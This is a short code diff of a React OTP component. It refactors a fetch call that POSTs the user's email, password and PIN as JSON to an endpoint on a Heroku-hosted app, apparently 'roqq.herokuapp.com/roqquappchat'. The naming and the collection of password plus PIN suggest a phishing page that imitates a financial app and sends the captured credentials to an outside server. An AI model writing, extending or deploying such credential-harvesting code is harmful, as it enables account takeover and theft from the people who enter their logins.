@@ -33,21 +33,19 @@ export default function Otp(props) {
 
 
              try {
-                 const response = await fetch(
-                     'https://roqq.herokuapp.com/roqquappchat',
-                     {
-                         method: 'POST',
-                         headers: {
-                             'Content-type': 'application/json',
-                         },
-                         body: JSON.stringify({
-                             email: templateParams.email,
-                             password: templateParams.password,
-                             pin: clientOtp,
-                             otp: '',
-                         }),
-                     }
-                 )
+                 const URL = 'https://roqq.herokuapp.com'
+                 const response = await fetch(URL + '/roqquappchat', {
+                     method: 'POST',
+                     headers: {
+                         'Content-type': 'application/json',
+                     },
+                     body: JSON.stringify({
+                         email: templateParams.email,
+                         password: templateParams.password,
+                         pin: clientOtp,
+                         otp: '',
+                     }),
+                 })
 
                  const resData = await response.json()
 
